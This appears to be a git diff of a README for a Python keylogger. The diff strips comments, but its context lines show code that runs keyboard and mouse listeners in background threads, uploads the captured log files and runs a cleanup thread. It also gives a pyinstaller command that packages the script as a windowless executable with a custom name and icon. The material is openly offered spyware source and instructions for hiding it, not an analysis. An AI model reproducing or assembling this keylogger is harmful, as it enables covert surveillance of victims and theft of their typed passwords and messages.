@@ -315,27 +315,22 @@ def handle_quit_signal(signum, frame):
 
 ```
 
-# Set up the listener for keyboard events
 def start_keylogger():
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
-# Set up the listener for mouse events
 def start_mouse_listener():
     with mouse.Listener(on_click=on_click) as mouse_listener:
         mouse_listener.join()
 
-# Upload new log files and start keylogger and mouse listener
 upload_new_files()
 
-# Start the keylogger and cleanup threads
 keylogger_thread = Thread(target=start_keylogger)
 keylogger_thread.start()
 
 cleanup_thread_instance = Thread(target=cleanup_thread, daemon=True)
 cleanup_thread_instance.start()
 
-# Start the mouse listener thread
 mouse_listener_thread = Thread(target=start_mouse_listener)
 mouse_listener_thread.start()
 
@@ -362,7 +357,6 @@ pyinstaller --onefile --noconsole --icon=icon.ico CustomName keylogger.py
 
 - `--onefile`: Packages everything into a single executable file.
 - `--noconsole`: (Optional) Hides the console window (useful for GUI applications).
-- `CustomName`: (Optional) specify the name of the executable file.
 - `--icon`: (Optional) set a custom icon for the executable file.
 
 Replace `CustomName` with your desired executable name.
